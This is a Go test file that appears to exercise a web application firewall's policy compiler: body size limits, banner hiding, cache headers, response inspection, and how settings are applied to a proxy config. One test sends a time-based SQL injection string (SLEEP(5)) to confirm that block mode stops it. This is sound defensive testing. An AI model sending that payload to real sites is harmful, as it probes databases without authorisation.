		small := "a=" + strings.Repeat("x", 1000)
		big := "a=" + strings.Repeat("x", 3000)
		huge := "a=" + strings.Repeat("x", 9000)
		if got := e.do("POST", "/p", nil, small); got != 200 {
			t.Errorf("a small form: %d", got)
		}
		if got := e.do("POST", "/p", nil, big); got != 413 {
			t.Errorf("a form over the form limit: %d, want 413", got)
		}
		upload, mpUp := multipart("a.txt", strings.Repeat("y", 3000))
		if got := e.do("POST", "/up", mpUp, upload); got != 200 {
			t.Errorf("an upload over the form limit and under the upload limit: %d, want 200", got)
		}
		bigUp, mpBig := multipart("a.txt", strings.Repeat("y", 9000))
		if got := e.do("POST", "/up", mpBig, bigUp); got != 413 {
			t.Errorf("an upload over the upload limit: %d, want 413", got)
		}
		if got := e.do("POST", "/p", nil, huge); got != 413 {
			t.Errorf("a huge form: %d, want 413", got)
		}
	})
	t.Run("responses", func(t *testing.T) {
		hide := newEdge(t, Default())
		keep := newEdge(t, mut(func(p *Policy) { p.Responses.KeepBanners = true }))
		if got := hide.send("GET", "/", nil, "").Header(); got.Get("X-Powered-By") != "" || got.Get("Server") != "" {
			t.Errorf("banners with the default: %v", got)
		}
		if got := keep.send("GET", "/", nil, "").Header(); got.Get("X-Powered-By") == "" {
			t.Errorf("banners with KeepBanners: %v", got)
		}
		cacheDefault := newEdge(t, Default())
		cacheKept := newEdge(t, mut(func(p *Policy) { p.Responses.KeepCaching = true }))
		if got := cacheDefault.send("GET", "/sets-cookie", nil, "").Header().Get("Cache-Control"); !strings.Contains(got, "no-store") {
			t.Errorf("a response that sets a cookie, with the default: Cache-Control %q", got)
		}
		if got := cacheKept.send("GET", "/sets-cookie", nil, "").Header().Get("Cache-Control"); got != "" {
			t.Errorf("a response that sets a cookie, with KeepCaching: Cache-Control %q", got)
		}
		leaky := newEdge(t, Default())
		inspecting := newEdge(t, mut(func(p *Policy) { p.Responses.Inspect = true }))
		if got := leaky.do("GET", "/leak", nil, ""); got != 200 {
			t.Errorf("a response that leaks, not inspected: %d", got)
		}
		if got := inspecting.do("GET", "/leak", nil, ""); got == 200 {
			t.Errorf("a response that leaks, inspected: %d (rules %v)", got, inspecting.ruleIDs())
		}
	})
}

// ApplyTo sets what the policy decides and nothing else.
func TestApplyToSetsOnlyWhatThePolicyDecides(t *testing.T) {
	c, err := Compile(mut(func(p *Policy) {
		p.AllowedHosts = []string{"a.example.test"}
		p.WordPress.Enabled = true
		p.Framework.DenyNextAction = true
		p.Body.MaxFormBytes = 4096
		p.Responses.Inspect = true
	}))
	if err != nil {
		t.Fatal(err)
	}
	cfg := proxy.Config{MaxUpstreamInFlight: 7, EvalBudget: 3 * time.Second, UpstreamHost: "origin.internal", MaxConnsPerIP: 9, AllowUpgrade: true, LogDetails: true}
	cfg.CRS.UploadDir = "/var/lib/carnical/uploads"
	cfg.CRS.DisableLocalRules, cfg.CRS.LocalRulesOff = true, []int{5006012}
	c.ApplyTo(&cfg)
	if cfg.MaxUpstreamInFlight != 7 || cfg.EvalBudget != 3*time.Second || cfg.UpstreamHost != "origin.internal" || cfg.MaxConnsPerIP != 9 || !cfg.AllowUpgrade || !cfg.LogDetails {
		t.Errorf("ApplyTo changed a setting that belongs to the machine: %+v", cfg)
	}
	if cfg.CRS.UploadDir != "/var/lib/carnical/uploads" {
		t.Errorf("the operator's upload directory was overwritten: %q", cfg.CRS.UploadDir)
	}
	if !cfg.CRS.DisableLocalRules || !reflect.DeepEqual(cfg.CRS.LocalRulesOff, []int{5006012}) {
		t.Errorf("the operator's choice of local rules was overwritten: %v %v", cfg.CRS.DisableLocalRules, cfg.CRS.LocalRulesOff)
	}
	if !reflect.DeepEqual(cfg.AllowedHosts, []string{"a.example.test"}) || !cfg.WordPress.Enabled || cfg.MaxFormBody != 4096 || !cfg.CRS.InspectResponses || !reflect.DeepEqual(cfg.DenyHeaders, []string{"next-action"}) {
		t.Errorf("the policy's settings were not applied: %+v", cfg)
	}
	cfg.AllowedHosts[0] = "changed"
	if c.AllowedHosts[0] != "a.example.test" {
		t.Error("ApplyTo shares its slices with the Compiled value")
	}
	if c.CRS.UploadDir != "" {
		t.Error("Compile set an upload directory, which is the operator's")
	}
}

// Every kind of policy builds a WAF in the engine, from crs.Settings.Directives(), and serves a request through proxy.New: in
// block mode an attack is stopped and an ordinary request passes.
func TestEveryCompiledPolicyBuildsAWAFAndServes(t *testing.T) {
	policies := compiledPolicyZoo(t)
	if len(policies) < 15 {
		t.Fatalf("only %d policies", len(policies))
	}
	for name, p := range policies {
		t.Run(name, func(t *testing.T) {
			t.Parallel()
			c, err := Compile(p)
			if err != nil {
				t.Fatal(err)
			}
			if err := c.CRS.Validate(); err != nil {
				t.Fatalf("crs.Settings.Validate: %v", err)
			}
			directives, err := c.CRS.Directives()
			if err != nil {
				t.Fatalf("crs.Settings.Directives: %v", err)
			}
			waf, err := coraza.NewWAF(coraza.NewWAFConfig().WithRootFS(crs.FS()).WithDirectives(directives))
			if err != nil {
				t.Fatalf("the engine refused the directives: %v", err)
			}
			_ = waf
			e := newEdge(t, p)
			if got := e.do("GET", "/", nil, ""); got != 200 {
				t.Fatalf("an ordinary request: %d (%v)", got, e.ruleIDs())
			}
			// Scores well over any blocking score a policy can ask for in block mode with sqli on: two critical rules, 10.
			attack := "/search?q=1%27+AND+SLEEP(5)+--"
			want := 403
			if p.Mode != ModeBlock || groupState(p, "sqli") != GroupOn {
				want = 200
			}
			if got := e.do("GET", attack, nil, ""); got != want {
				t.Fatalf("the attack: %d, want %d (%v)", got, want, e.ruleIDs())
			}
		})
	}
}
